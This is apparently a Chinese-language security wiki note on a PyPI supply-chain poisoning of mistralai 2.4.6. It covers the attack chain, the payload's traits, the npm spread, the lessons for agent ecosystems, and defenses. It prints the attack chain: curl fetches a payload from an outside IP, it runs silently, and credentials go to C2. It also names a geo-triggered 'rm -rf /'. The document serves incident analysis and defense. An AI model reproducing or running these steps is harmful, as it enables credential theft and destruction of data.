---
title: MistralAI PyPI 供应链投毒事件（Mini Shai-Hulud）
created: 2026-05-15
type: concept
tags: [security, supply-chain, pypi, hermes, credential-stealer]
sources:
  - raw/articles/supply-chain-attack-mistralai-hermes-20260513.md
confidence: high
---

# MistralAI PyPI 供应链投毒事件（Mini Shai-Hulud）

2026年5月11-12日，[[Hermes Agent]] 生态遭遇严重供应链攻击。攻击者通过 PyPI 官方渠道发布 `mistralai` 2.4.6 恶意版本，`import` 即触发远控载荷下载，窃取全部环境变量中的凭据。

## 攻击链路

```
pip install mistralai==2.4.6
  → import mistralai
    → __init__.py 自动执行 _run_background_task()
      → curl -k https://83.142.209.194/transformers.pyz → /tmp/
        → python3 /tmp/transformers.pyz（后台静默）
          → 窃取所有环境变量 → C2 回传
```

**两个关键突破点：**

1. **发布链路被劫持**：恶意版本无对应 GitHub tag/commit/release workflow run，但挂载在 PyPI 官方包名之下。用户信任"官方来源"自动中招。
2. **import 即触发**：无需调用任何函数，`pip install` 后首次 `import` 就中招。Agent 的自动化安装（`pip install mistralai`）变成攻击高速公路。

## 恶意载荷特性

| 特性 | 细节 |
|------|------|
| 平台 | 仅 Linux |
| 窃取目标 | `.env` API Key、GitHub Token、数据库密码、云 AK/SK |
| 地理判定 | 俄语环境退出；以色列/伊朗 1/6 概率 `rm -rf /` |
| C2 | 83.142.209.194 |
| 静默 | 吞掉所有异常，零日志 |

## 波及范围（Mini Shai-Hulud 攻击）

| 生态 | 数量 |
|------|------|
| PyPI | mistralai 2.4.6、guardrails-ai 0.10.1 等 3 包 |
| npm | 170+ 包（含 TanStack 42 个包），404 个恶意版本 |

**TanStack 案例的不同路径**：利用 `pull_request_target` PR 污染 CI 缓存 → 从 CI runner 内存读取 OIDC token → 合法身份发布恶意包。

## 对 Agent 生态的深层教训

1. **信任链污染**：官方包名 + 正规仓库 ≠ 安全。传统检查（包名、发布者）失效。
2. **Agent 自动化 = 攻击高速公路**：人类会犹豫，Agent 直接 `pip install`。
3. **环境变量全暴露**：Agent 通常需要大量 API Key，一次投毒全部沦陷。
4. **发布链路是真正的战场**：攻击者打穿的不是终端用户，是 CI/CD 和包管理器。

## 防护措施

### 紧急自查（已完成，系统干净）
```bash
pip show mistralai    # 确认未安装 ✅
ls /tmp/transformers.pyz   # 确认不存在 ✅
```

### 长期防御
- 锁定依赖版本 + pip hash-checking
- 最小权限：Agent 不应默认拥有所有环境变量
- 按环境隔离密钥（dev/staging/prod 不同 key）
- 使用短期有效 token 而非永久 API Key

## 相关

- [[hermes-security-model]] — Hermes 7 层安全防线，本次攻击暴露了供应链层的缺失
- [[ai-security-five-layer-framework]] — 五层框架视角下的供应链攻击分析
- [[hermes-agent]] — 受影响生态
- [[jackcui]] — 来源作者
